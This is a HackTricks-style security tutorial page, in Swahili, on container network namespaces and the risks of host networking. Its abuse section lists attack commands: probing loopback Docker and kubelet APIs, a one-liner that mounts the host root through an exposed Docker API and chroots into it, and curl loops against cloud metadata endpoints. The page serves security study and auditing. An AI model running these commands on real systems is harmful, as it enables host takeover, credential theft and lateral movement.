# Namespace ya Mtandao

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

Namespace ya mtandao inatenga rasilimali zinazohusiana na mtandao kama interfaces, anwani za IP, jedwali za routing, hali ya ARP/jirani, sheria za firewall, sockets, na maudhui ya mafaili kama `/proc/net`. Hii ndiyo sababu container inaweza kuonekana kuwa na `eth0` yake mwenyewe, njia zake za ndani, na kifaa chake cha loopback bila kumiliki stack halisi ya mtandao ya host.

Kisecurity, hili ni muhimu kwa sababu kutengwa kwa mtandao ni zaidi ya kuunganisha bandari. Namespace ya mtandao binafsi inaleta kikomo kwa kile workload inachoweza kuona moja kwa moja au kurekebisha. Mara namespace hiyo ikishoshirikiwa na host, container inaweza ghafla kupata uonekano wa listeners za host, services za host-local, na pointi za udhibiti wa mtandao ambazo hazikutakiwa kufichuliwa kwa application.

## Operesheni

Namespace ya mtandao iliyoundwa hivi karibuni inaanza na mazingira ya mtandao tupu au karibu tupu mpaka interfaces ziambatishwe. Container runtimes kisha huunda au kuunganisha virtual interfaces, kugawa anwani, na kusanidi routes ili workload ipate connectivity inayotarajiwa. Katika deployments zinazotegemea bridge, hii kwa kawaida ina maana container inaona interface ya veth-backed imeunganishwa na host bridge. Katika Kubernetes, plugins za CNI zinashughulikia usanidi sawia kwa ajili ya networking ya Pod.

Mimarisha hii inaelezea kwa nini `--network=host` au `hostNetwork: true` ni mabadiliko makubwa. Badala ya kupokea stack ya mtandao binafsi iliyotayarishwa, workload inaungana na ile halisi ya host.

## Maabara

Unaweza kuona namespace ya mtandao karibu tupu kwa:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Na unaweza kulinganisha containers za kawaida na host-networked containers kwa:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
The host-networked container haioni tena socket na mtazamo wa interface zake zilizotengwa. Mabadiliko hayo peke yake ni makubwa kabla hata hujauliza ni capabilities gani mchakato unao.

## Matumizi ya Runtime

Docker na Podman kawaida huunda namespace ya mtandao binafsi kwa kila container isipokuwa imewekwa vinginevyo. Kubernetes kwa kawaida humpa kila Pod namespace ya mtandao yake mwenyewe, inayoshirikiwa na containers ndani ya Pod hiyo lakini tofauti na host. Incus/LXC pia hutoa utengano ulio tajiri unaotegemea network-namespace, mara nyingi kwa aina mbalimbali za miundombinu ya virtual networking.

Kanuni ya kawaida ni kwamba networking binafsi ni mipaka ya chaguo-msingi ya utengano, wakati host networking ni uteuzi wa wazi wa kujiondoa kutoka kwenye mipaka hiyo.

## Usanidi mbaya

Kosa muhimu zaidi la usanidi ni kushiriki namespace ya mtandao ya host. Hii mara nyingine hufanywa kwa ajili ya performance, low-level monitoring, au urahisi, lakini inaondoa moja ya mipaka safi inayopatikana kwa containers. Listener za host-local zinakuwa zinafikika kwa njia ya moja kwa moja zaidi, localhost-only services zinaweza kupatikana, na capabilities kama `CAP_NET_ADMIN` au `CAP_NET_RAW` zinakuwa hatari zaidi kwa sababu operesheni wanazowezesha sasa zinafanywa kwenye mazingira ya mtandao ya host mwenyewe.

Shida nyingine ni kutoa kwa wingi network-related capabilities hata wakati namespace ya mtandao ni binafsi. Namespace binafsi inasaidia, lakini haitufanyi raw sockets au udhibiti wa mtandao wa hali ya juu kuwa pasipo hatari.

## Matumizi mabaya

Katika mipangilio yenye utengano dhaifu, attackers wanaweza kukagua host listening services, kufikia management endpoints zilibind kwa loopback pekee, sniff au kuingilia trafiki kulingana na capabilities halisi na mazingira, au kurekebisha routing na state ya firewall ikiwa `CAP_NET_ADMIN` ipo. Katika cluster, hili pia linaweza kufanya lateral movement na control-plane reconnaissance kuwa rahisi.

Ukishuku host networking, anza kwa kuthibitisha kuwa interfaces na listeners zinazoonekana zinamilikiwa na host badala ya network ya container iliyotengwa:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Huduma za loopback-only mara nyingi ni ugunduzi wa kwanza wa kuvutia:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ikiwa uwezo wa mtandao upo, jaribu kama workload inaweza kuchunguza au kubadilisha stack inayoweza kuonekana:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Katika mazingira ya cluster au cloud, host networking pia inatoa sababu ya kufanya recon ya ndani ya haraka ya metadata na huduma zinazokaribu na control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Mfano Kamili: Host Networking + Local Runtime / Kubelet Access

Host networking haitoi kwa moja kwa moja host root, lakini mara nyingi huonyesha huduma ambazo kwa makusudi zinapatikana tu kutoka kwenye node yenyewe. Ikiwa moja ya huduma hizo imekingwa kwa udhaifu, host networking inakuwa njia ya moja kwa moja ya privilege-escalation.

Docker API kwenye localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet kwenye localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Athari:

- kuvamiwa moja kwa moja kwa host ikiwa local runtime API imefunuliwa bila ulinzi unaofaa
- cluster reconnaissance au lateral movement ikiwa kubelet au local agents zinapatikana
- traffic manipulation au denial of service wakati zikichanganywa na `CAP_NET_ADMIN`

## Ukaguzi

Lengo la ukaguzi huu ni kubaini kama mchakato una private network stack, ni routes na listeners gani zinaonekana, na kama network view tayari inaonekana host-like kabla hata hujaanza kujaribu capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Kinachovutia hapa:

- Ikiwa kitambulisho cha namespace au seti ya interface zinazoonekana zinafanana na host, host networking inaweza tayari kutumika.
- `ss -lntup` ni muhimu sana kwa sababu inaonyesha loopback-only listeners na local management endpoints.
- Routes, interface names, na firewall context zinakuwa muhimu zaidi ikiwa `CAP_NET_ADMIN` au `CAP_NET_RAW` zipo.

Unapokagua container, daima tathmini network namespace pamoja na capability set. Host networking pamoja na network capabilities kali ni mtazamo tofauti kabisa kuliko bridge networking pamoja na capability set ndogo ya default.
